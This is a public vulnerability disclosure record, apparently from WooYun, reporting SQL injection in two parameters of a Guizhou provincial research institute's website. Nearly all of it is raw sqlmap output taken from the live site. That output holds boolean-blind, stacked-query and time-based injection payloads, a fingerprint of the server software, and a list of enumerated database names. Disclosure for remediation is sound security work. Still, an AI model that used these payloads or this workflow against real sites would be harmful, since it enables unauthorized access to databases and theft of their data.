wybug_title: 贵州省某研究所网站多个SQL注入
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-09-30：	细节已通知厂商并且等待厂商处理中									2014-10-05：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： ~~~~~ 详细说明：  1*   http://sts.gzsti.gov.cn/Map.aspx?Big=5
---Place: GETParameter: Big    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Big=5' AND 9027=9027 AND 'shkJ'='shkJ    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: Big=5'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: Big=5' WAITFOR DELAY '0:0:5'-----[20:16:07] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[20:16:07] [INFO] fetching database names[20:16:07] [INFO] fetching number of databases[20:16:07] [INFO] resumed: 12[20:16:07] [INFO] resumed: GXCYDB[20:16:07] [INFO] resumed: master[20:16:07] [INFO] resumed: model[20:16:07] [INFO] resumed: msdb[20:16:07] [INFO] resumed: pt[20:16:07] [INFO] resumed: QBSDB123[20:16:07] [INFO] resumed: QBSPTDB[20:16:07] [INFO] resumed: ReportServer[20:16:07] [INFO] resumed: ReportServerTempDB[20:16:07] [INFO] resumed: tempdb[20:16:07] [INFO] resumed: TT[20:16:07] [INFO] resumed: xtavailable databases [12]:[*] GXCYDB[*] master[*] model[*] msdb[*] pt[*] QBSDB123[*] QBSPTDB[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] TT[*] xt


2*   http://sts.gzsti.gov.cn/Display.aspx?TID=01
[*] shutting down at 20:18:08[root@Hacker~]# Sqlmap -u http://sts.gzsti.gov.cn/Display.aspx?TID=01 --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:18:13[20:18:13] [INFO] resuming back-end DBMS 'microsoft sql server'[20:18:13] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: TID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: TID=01' AND 9906=9906 AND 'WCSx'='WCSx---[20:18:13] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[20:18:13] [INFO] fetching database names[20:18:13] [INFO] fetching number of databases[20:18:13] [INFO] resumed: 12[20:18:13] [INFO] resumed: GXCYDB[20:18:13] [INFO] resumed: master[20:18:13] [INFO] resumed: model[20:18:13] [INFO] resumed: msdb[20:18:13] [INFO] resumed: pt[20:18:13] [INFO] resumed: QBSDB123[20:18:13] [INFO] resumed: QBSPTDB[20:18:13] [INFO] resumed: ReportServer[20:18:13] [INFO] resumed: ReportServerTempDB[20:18:13] [INFO] resumed: tempdb[20:18:13] [INFO] resumed: TT[20:18:13] [INFO] resumed: xtavailable databases [12]:[*] GXCYDB[*] master[*] model[*] msdb[*] pt[*] QBSDB123[*] QBSPTDB[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] TT[*] xt
